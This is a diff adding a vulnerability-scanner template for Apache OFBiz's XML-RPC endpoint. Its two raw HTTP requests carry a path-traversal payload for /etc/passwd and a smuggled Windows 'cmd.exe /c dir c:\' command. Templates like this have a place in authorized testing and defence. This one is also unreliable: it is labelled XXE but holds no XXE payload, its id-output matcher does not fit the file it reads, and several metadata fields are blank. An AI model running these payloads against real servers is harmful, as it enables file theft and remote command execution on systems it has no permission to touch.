@@ -1,0 +1,60 @@
+id: apache-ofbiz-xmlrpc-xxe
+info:
+  name: apache OFBiz xmlrpc - xxe fileread
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://github.com/CRlife/Rscan/blob/0edbf44689fbc876294a7d8603639dfe44fabeee/poc/yaml-poc/poc-yaml-Apache-OFBiz-read-file.yaml
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+  tags: apache,ofbiz,xxe,fileread
+
+http:
+  - raw:
+      - |
+        POST /webtools/control/xmlrpc HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml
+
+        <?xml version="1.0"?>
+        <methodCall>
+          <methodName>example.createBlogPost</methodName>
+          <params>
+            <param>
+              <value><string>../../../../../../etc/passwd</string></value>
+            </param>
+        </params>
+        </methodCall>
+      
+      - |+
+        POST /webtools/control/xmlrpc HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml
+        
+        <?xml version="1.0"?>
+        <methodCall>
+          <methodName>performCommand</methodName>
+          <params>
+            <param>
+              <value><string>../../../../../../windows/system32/cmd.exe?/c+dir+c:\</string></value>
+            </param>
+        </params>
+        </methodCall>
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "Program Files"
+          - "((u|g)id|groups)=[0-9]{1,4}\\([a-z0-9]+\\)"
+        condition: or
+
+      - type: status
+        status:
+          - 200
